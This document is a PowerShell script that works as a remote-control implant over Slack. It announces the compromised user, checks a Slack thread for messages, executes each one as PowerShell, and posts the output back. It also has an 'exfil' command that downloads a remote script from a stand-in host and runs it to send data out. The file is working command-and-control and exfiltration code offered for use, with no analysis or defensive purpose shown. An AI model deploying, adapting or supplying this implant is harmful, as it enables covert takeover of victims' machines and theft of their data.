# slack token: https://app.slack.com/app-settings/.../.../oauth
# channel id: right click channel -> "Channel details" -> "View channel details" -> at the bottom you will see "Channel ID"
$slackToken = ""
$channelId  = ""

$headers = @{
    Authorization = "Bearer $slackToken"
    "Content-Type" = "application/json; charset=utf-8"
}

$lastMsg = $null

# slack wrapper for messages
function slack-wrapper {
    param(
        [Parameter(Mandatory)]
        [string]$txt,
        [string]$threadTs,
        [switch]$PassThru
    )

    $payload = @{
        channel = $channelId
        text    = $txt
    }

    if ($threadTs) {
        $payload.thread_ts = $threadTs
    }

    $body = $payload | ConvertTo-Json

    $response = Invoke-RestMethod -Method Post -Uri "https://slack.com/api/chat.postMessage" -Headers $headers -Body $body -ErrorAction Stop

    if (-not $response.ok) {
        throw "Slack error: $($response.error)"
    }

    if ($PassThru) {
        return $response
    }
}

# do some escaping magic wrapper
function mrkDwnConvert {
    param(
        [Parameter(Mandatory)]
        [string]$txt
    )

    $escResult = $txt

    # <https://example.com|Example> -> Example
    $escResult = $escResult -replace '<(https?://[^|>]+)\|([^>]+)>', '$2'

    # <https://example.com> -> https://example.com
    $escResult = $escResult -replace '<(https?://[^>]+)>', '$1'

    # decode escaped characters
    $escResult = $escResult.
    Replace('&lt;', '<').
    Replace('&gt;', '>').
    Replace('&amp;', '&')

    return $escResult
}

# announce device join
$joinResponse = slack-wrapper -txt ":desktop_computer:: ``$([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)`` Connected!" -PassThru
$threadTs = [string]$joinResponse.ts
$lastMsg = [decimal]$threadTs

while ($true) {

    try {
        $url = "https://slack.com/api/conversations.replies?channel=$channelId&ts=$threadTs&limit=100"
        $history = Invoke-RestMethod -Method Get -Uri $url -Headers $headers

        # return newest msg first
        $msgs = @(
        $history.messages |
            Where-Object { $_.ts -ne $threadTs } |
            Sort-Object { [decimal]$_.ts }
        )
        [array]::Reverse($msgs)

        foreach ($msg in $msgs) {
            $status = $null
            $exec   = $null
            $result = $null

            # ignore bot own msgs
            if ($msg.bot_id -or $msg.subtype -eq "bot_message") {
                continue
            }

            # ignore already processed msgs
            if ($lastMsg -and
                [decimal]$msg.ts -le [decimal]$lastMsg) {
                continue
            }

            slack-wrapper -txt ":hourglass_flowing_sand: Tasked: ``````$($msg.text)``````" -threadTs $threadTs

            # execute msg/cmd
            $ps = $null

            try {
                $cnvrt = mrkDwnConvert($msg.text)

                # exit
                if ($cnvrt -match '^exit\b') {
                    slack-wrapper -txt "> *Connection killed!*" -threadTs $threadTs
                    exit
                }
                elseif
                # exfil command
                ($cnvrt -match '^exfil\b') {
                    $edest = $null
                    $eout  = $null
                    $u     = $false

                    if ($cnvrt -match '-edest\s+"([^"]+)"') { $edest = $Matches[1] }
                    if ($cnvrt -match '-eout\s+"([^"]+)"') { $eout = $Matches[1] }
                    if ($cnvrt -match '(?:^|\s)-u(?:\s|$)') { $u = $true }

                    if ([string]::IsNullOrWhiteSpace($edest) -or [string]::IsNullOrWhiteSpace($eout)) {
                        throw 'Both -edest and -eout are required'
                    }

                    $remArgs = @{
                        edest = $edest
                        eout  = $eout
                        threadTs = $threadTs
                    }

                    if ($u) { $remArgs.u = $true}

                    $code = Invoke-RestMethod -Uri "https://example.com/exfil.ps1"
                    $scrBlock = [ScriptBlock]::Create($code) # load the script
                    $result = & $scrBlock @remargs # exec and pass arguments

                    $status = ":white_check_mark: Executed"

                    if ($null -eq $result) {
                        $exec = "Exfil operation successful!"
                    }
                    else {
                        $exec = $result | Out-String
                    }
                }else{
                    # ignore iex to execute .NET or cmds
                    $ps = [PowerShell]::Create()
                    $ps.AddScript($cnvrt) | Out-Null
                    $result = $ps.Invoke()

                    if ($ps.Streams.Error.Count -gt 0) {
                        $status = ":x: Execution failed"
                        $exec = ($ps.Streams.Error | ForEach-Object { $_.ToString() })
                    }
                    else {
                        $status = ":white_check_mark: Executed"
                        $exec = $result | Out-String
                    }
                }
            }
            catch {
                $status = ":x: Execution failed"
                $exec = $_.Exception.Message
            }
            finally {
                if ($null -ne $ps) {
                    $ps.Dispose()
                }
            }
            slack-wrapper -txt $status -threadTs $threadTs

            # send the output
            $execText = $exec -join "`n"
            if ([string]::IsNullOrWhiteSpace($execText)) {
                $reply = "``````NULL``````"
            }
            else {
                $reply = '```' + $execText + '```'
            }

            $Body = @{
                channel = $channelId
                text    = $reply
            } | ConvertTo-Json

            slack-wrapper -txt ":hourglass: Output:" -threadTs $threadTs
            slack-wrapper -txt $reply -threadTs $threadTs

            $lastMsg = $msg.ts
        }

    }
    catch {
        Write-Warning $_
    }

    Start-Sleep -Seconds 10
}
